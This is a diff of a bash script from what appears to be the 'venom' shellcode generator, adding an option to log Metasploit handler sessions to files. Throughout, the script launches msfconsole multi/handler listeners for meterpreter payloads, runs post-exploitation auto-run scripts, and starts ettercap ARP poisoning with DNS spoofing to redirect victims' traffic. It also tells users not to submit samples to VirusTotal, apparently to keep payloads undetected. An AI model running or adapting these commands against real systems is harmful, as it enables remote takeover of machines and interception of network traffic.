@@ -81,6 +81,9 @@ MsFu=`cat settings | egrep -m 1 "MSF_UPDATE" | cut -d '=' -f2` > /dev/null 2>&1
 ApAcHe=`cat settings | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1
 D0M4IN=`cat settings | egrep -m 1 "MEGAUPLOAD_DOMAIN" | cut -d '=' -f2` > /dev/null 2>&1
 DrIvC=`cat settings | egrep -m 1 "WINE_DRIVEC" | cut -d '=' -f2` > /dev/null 2>&1
+MsFlF=`cat settings | egrep -m 1 "MSF_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
+
+
 
 
 
@@ -134,6 +137,19 @@ cat << !
   xterm -T " UPDATING MSF DATABASE " -geometry 110x23 -e "msfconsole -x 'msfupdate; exit -y' && sleep 2"
 fi
 
+
+
+# -----------------------------------------------
+# venom framework configurated to store logfiles?
+# -----------------------------------------------
+if [ "$MsFlF" = "ON" ]; then
+cat << !
+    ╔─────────────────────────────────────────────────╗
+    | venom framework configurated to store logfiles  |
+    ╚─────────────────────────────────────────────────╝
+!
+sleep 2
+fi
 
 
 
@@ -429,7 +445,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -460,7 +490,22 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
 
@@ -471,7 +516,21 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
 
         fi
    fi
@@ -613,7 +672,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -672,7 +745,22 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
 
@@ -683,7 +771,24 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
+
+
+
 
         fi
    fi
@@ -771,7 +876,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log;  use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -830,7 +949,21 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
 
         else
 
@@ -841,8 +974,21 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -954,7 +1100,23 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
-     xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+       if [ "$MsFlF" = "ON" ]; then
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+         cd $IPATH/output
+         # delete utf-8/non-ancii caracters from output
+         tr -cd '\11\12\15\40-\176' < report.log > final.log
+         sed -i "s/\[0m//g" final.log
+         sed -i "s/\[1m\[34m//g" final.log
+         sed -i "s/\[4m//g" final.log
+         sed -i "s/\[K//g" final.log
+         mv final.log $N4m-$lhost.log > /dev/null 2>&1
+         rm report.log > /dev/null 2>&1
+         cd $IPATH/
+       else
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+       fi
+
+
 
      # CLEANING EVERYTHING UP
      echo "[☠] Cleanning temp generated files..."
@@ -978,7 +1140,21 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
-     xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+       if [ "$MsFlF" = "ON" ]; then
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+         cd $IPATH/output
+         # delete utf-8/non-ancii caracters from output
+         tr -cd '\11\12\15\40-\176' < report.log > final.log
+         sed -i "s/\[0m//g" final.log
+         sed -i "s/\[1m\[34m//g" final.log
+         sed -i "s/\[4m//g" final.log
+         sed -i "s/\[K//g" final.log
+         mv final.log $N4m-$lhost.log > /dev/null 2>&1
+         rm report.log > /dev/null 2>&1
+         cd $IPATH/
+       else
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+       fi
 
      # CLEANING EVERYTHING UP
      echo "[☠] Cleanning temp generated files..."
@@ -1013,7 +1189,22 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
-       xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+         if [ "$MsFlF" = "ON" ]; then
+           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+           cd $IPATH/output
+           # delete utf-8/non-ancii caracters from output
+           tr -cd '\11\12\15\40-\176' < report.log > final.log
+           sed -i "s/\[0m//g" final.log
+           sed -i "s/\[1m\[34m//g" final.log
+           sed -i "s/\[4m//g" final.log
+           sed -i "s/\[K//g" final.log
+           mv final.log $N4m-$lhost.log > /dev/null 2>&1
+           rm report.log > /dev/null 2>&1
+           cd $IPATH/
+         else
+           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+         fi
+
 
        # CLEANING EVERYTHING UP
        echo "[☠] Cleanning temp generated files..."
@@ -1149,7 +1340,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+         if [ "$MsFlF" = "ON" ]; then
+           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+           cd $IPATH/output
+           # delete utf-8/non-ancii caracters from output
+           tr -cd '\11\12\15\40-\176' < report.log > final.log
+           sed -i "s/\[0m//g" final.log
+           sed -i "s/\[1m\[34m//g" final.log
+           sed -i "s/\[4m//g" final.log
+           sed -i "s/\[K//g" final.log
+           mv final.log $N4m-$lhost.log > /dev/null 2>&1
+           rm report.log > /dev/null 2>&1
+           cd $IPATH/
+         else
+           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+         fi
       sleep 2
 
 
@@ -1222,7 +1427,22 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
 
@@ -1233,8 +1453,21 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -1363,7 +1596,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -1435,7 +1682,22 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
 
@@ -1446,8 +1708,21 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -1559,8 +1834,23 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
